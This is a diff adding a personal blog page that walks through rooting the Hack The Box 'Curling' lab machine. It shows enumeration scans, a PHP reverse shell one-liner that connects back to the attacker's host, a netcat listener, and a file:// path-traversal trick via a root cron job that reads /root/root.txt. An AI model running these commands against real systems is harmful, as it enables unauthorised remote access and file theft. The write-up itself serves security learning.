@@ -1,0 +1,140 @@
+<!DOCTYPE HTML>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  <title>Hack The Box | sawicky&#39;s space</title>
+  <meta name="author" content="David Sawick">
+
+  
+  <meta name="description" content="Hack the Box - Curlingpwned: 21/02/2019Today I rooted the Curling box, which was done in around an hour, and was a nice relief compared to Chaos.
+I wa">
+  
+  
+
+  <link rel="alternate" href="/atom.xml" title="sawicky&#39;s space" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.8/jquery.min.js"></script>
+  
+</head></html>
+
+<body>
+  <header id="header" class="inner"><nav>
+  <ul>
+    
+      <li><a href="/">home</a></li>
+    
+      <li><a href="/archives">archive</a></li>
+    
+      <li><a href="/ctf">ctf</a></li>
+    
+      <li><a href="/pwn">pwn</a></li>
+    
+      <li><a href="/about">about</a></li>
+    
+      <li><a href="/portfolio">portfolio</a></li>
+    
+  </ul>
+</nav></header>
+  <div id="content" class="inner"><article class="page">
+  
+  <header>
+    
+  
+    <h1 class="title">Hack The Box</h1>
+  
+
+    
+  </header>
+  <div class="entry-content">
+    
+      <h2 id="Hack-the-Box-Curling"><a href="#Hack-the-Box-Curling" class="headerlink" title="Hack the Box - Curling"></a>Hack the Box - Curling</h2><h5 id="pwned-21-02-2019"><a href="#pwned-21-02-2019" class="headerlink" title="pwned: 21/02/2019"></a>pwned: 21/02/2019</h5><p>Today I rooted the Curling box, which was done in around an hour, and was a nice relief compared to Chaos.</p>
+<p>I was told that this one was one of the easier ones, so I was excited to try something that wouldn’t take me like 72 hours.</p>
+<h3 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h3><p>I started off with a basic nmap scan, to find some services running.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -v 10.10.10.150</span><br></pre></td></tr></table></figure></p>
+<a href="/media/images/pwn/huge-curling1-enum.png"><img src="/media/images/pwn/body-curling1-enum.png" alt="Expand Image" title="Curling"></a>
+<p>This led me to a webserver, which I placed into my browser, and concurrently ran a dirb scan:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://10.10.10.150 /usr/share/wordlists/dirb/common.txt</span><br></pre></td></tr></table></figure>
+<p>Dirb found a secret.txt file, which was a b64 encoded string, and it looked like a password. I don’t know who’s password this was yet:</p>
+<a href="/media/images/pwn/huge-curling3-admin.png"><img src="/media/images/pwn/body-curling3-admin.png" alt="Expand Image" title="Curling"></a>
+<p>Something strange happened at this point, and when I went back to the main menu, a dialog for command was shown, allowing remote execution without any filtering. Very weird. Also, the only author for the posts on the main page was by ‘floris’, so I assume that the password I found was for floris. I tried logging into the admin control panel that was visible on the main page, and was greeted with this page:</p>
+<a href="/media/images/pwn/huge-curling2-reverseshell.png"><img src="/media/images/pwn/body-curling2-reverseshell.png" alt="Expand Image" title="Curling"></a>
+<p>It was the same RCE command prompt, as well as a directory listing all files under www-data. I popped in a quick PHP reverse shell one liner:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &apos;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;</span><br></pre></td></tr></table></figure></p>
+<p>And listened to it with the following:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p 5555</span><br></pre></td></tr></table></figure></p>
+<p>This worked instantly, and I was in a low-priv shell.<br>I begun my enumeration with trying to log in with floris, just like I tried with Chaos, however I needed an interactive shell.<br>No matter what I did, I could not upgrade my TTY, and thus could not log in directly with his credentials.</p>
+<p>I then tried browsing through the /home/ directory, and found out that the www-data user could read floris’ home folder, but not any contents here. </p>
+<p>There was another file here called password_backup. When i ran cat on it, it spit out a hex file. I knew what to do with this, so I used the techniques I learned in chaos to download the password_backup file to my host computer:</p>
+<a href="/media/images/pwn/huge-curling4-passwordbackup.png"><img src="/media/images/pwn/body-curling4-passwordbackup.png" alt="Expand Image" title="Curling"></a>
+<p>Since this was a hex dump of a file, I used the reverse parameter of xxd to form it back into a file. This was a technique I learned in a Digital Forensics class.<br>I then used file to confirm what type of file it was by reading the magic file signature.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxd -r password_backup &gt; pass</span><br></pre></td></tr></table></figure></p>
+<a href="/media/images/pwn/huge-curling5-dehexxing.png"><img src="/media/images/pwn/body-curling5-dehexxing.png" alt="Expand Image" title="Curling"></a>
+<p>After using file to see what type of file it was, it turned out to be a bzip2 compressed archive:</p>
+<a href="/media/images/pwn/huge-curling5-dehexedfile.png"><img src="/media/images/pwn/body-curling5-dehexedfile.png" alt="Expand Image" title="Curling"></a>
+<p>I then begun a chain of </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bunzip2, gunzip, tar -xvf, file</span><br></pre></td></tr></table></figure>
+<p>a few times in a row, similar to Bandit 15 in order to get the final file - a password.txt file. This password txt file contained a password, I assumed for floris.<br>So i then tried to ssh in using that password:</p>
+<a href="/media/images/pwn/huge-curling6-userown.png"><img src="/media/images/pwn/body-curling6-userown.png" alt="Expand Image" title="Curling"></a>
+<p>And this was the user own. </p>
+<h3 id="Root-Own"><a href="#Root-Own" class="headerlink" title="Root Own"></a>Root Own</h3><p>This step was a little tricky. I noticed there was a directory named admin-area, which I navigated to, and contained only 2 files: </p>
+<ul>
+<li>input</li>
+<li>report</li>
+</ul>
+<p>The input was just a string containing<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url = &quot;http:/127.0.0.1&quot;</span><br></pre></td></tr></table></figure></p>
+<p>Since I have used config files for curl before in previous classes or at home, I know that this is an arg that curl accepts from a file using the -K parameter. This was confirmed because the ‘report’ file, was just a curl of localhost, the webserver.</p>
+<p>I tried to edit the file to say<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url = &quot;http://127.0.0.1/root/root.txt&quot;</span><br></pre></td></tr></table></figure></p>
+<p>in the hope that it would work, and ran<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -K input</span><br></pre></td></tr></table></figure></p>
+<p>myself, and didn’t result in anything. However I noticed something stranged happened - The input file was reverted back to saying<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url = &quot;http:/127.0.0.1&quot;</span><br></pre></td></tr></table></figure></p>
+<p>and the report file contained the output of my own curl -K input file. </p>
+<p>I experimented for a little bit more, and every time, after a few seconds, the input file would revert back to default, and the report would show whatever I tried to replace the input file with previously. </p>
+<p>I went to the HTB Curling forum for some hints, and confirmed my suspicion that this was actually a job running by cron. I didn’t neccesarily use that information to my advantage, but instead I researched on ways to curl local files. </p>
+<p>Turns out, you can use<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:///yourfile.txt</span><br></pre></td></tr></table></figure></p>
+<p>and curl will retrieve the file. I struggled on this step for about 20 minutes, trying to figure out how to get /root/root.txt (as that seems like where every root flag is). I googled how to do directory traversal using curl, and one of the first results was a stackoverflow page for something completely unrelated, but had the following curl command:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl file:///localhost/../../../home/user/script.sh</span><br></pre></td></tr></table></figure></p>
+<p>Which means, this exited /var/www/html and found itself on the filesystem root.</p>
+<p>I then modified the input file to use that URI instead:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url = &quot;file:///127.0.0.1/../../../root/root.txt</span><br></pre></td></tr></table></figure></p>
+<a href="/media/images/pwn/huge-curling7-rooted.png"><img src="/media/images/pwn/body-curling7-rooted.png" alt="Expand Image" title="Curling"></a>
+<p>I waited a few minutes to see if the report file changed, and when I cat the result some time later, I found a string which ended up being the root flag.</p>
+<h3 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h3><p>A pretty interesting flag that spiked up in complexity for root, but I felt like some other users did the steps for me, as there a RCE dialog straight on the main page of the website - I don’t think this was intentional.</p>
+<p>I also believe there is a better way to get the root flag, as I did not get root shell. There is probably some way to modify the cron job to instead of running curl, run some other command of my choosing, but doing a <code>ls -la /etc/ | grep cron</code>, revealed that those files were writeable by root only.</p>
+<p>I probably should have done 127.0.0.1/../../../bin/sh instead, as the cronjob runs that file as root, and I would have possibly gotten a root shell that way, but in the end I still got the flag.</p>
+
+    
+    
+  </div>
+  
+</article></div>
+  <footer id="footer" class="inner"><div class="social alignright">
+  
+  
+  
+  
+  <a class="rss" href="/atom.xml" title="RSS">RSS</a>
+</div>
+<p>
+  
+  &copy; 2019 David Sawick
+  
+</p>
+<div class="clearfix"></div></footer>
+  <script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+<div id="phasebeam">
+  <canvas></canvas>
+  <canvas></canvas>
+  <canvas></canvas>
+</div>
+<script src="/js/phasebeam.js"></script>
+</body>
+</html>
